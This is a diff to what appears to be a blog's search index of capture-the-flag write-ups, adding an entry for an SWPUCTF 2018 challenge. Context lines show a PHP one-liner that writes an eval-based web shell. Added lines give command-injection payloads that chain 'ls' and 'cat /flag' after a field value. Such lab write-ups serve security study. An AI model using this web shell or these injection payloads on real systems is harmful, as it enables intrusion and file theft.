@@ -609,6 +609,13 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p><img src="/2022/12/02/kk/effect.jpg" alt="进程图"></p>
 </li>
 </ol>
+<p>111||cd ..&#x2F;..&#x2F;..&#x2F;&amp;&amp;ls;</p>
+<p>111||cd ..&#x2F;..&#x2F;..&#x2F;&amp;&amp;cat &#x2F;flag;</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>pla</title>
+    <url>/2022/12/02/pla/</url>
+    <content><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2>]]></content>
   </entry>
 </search>
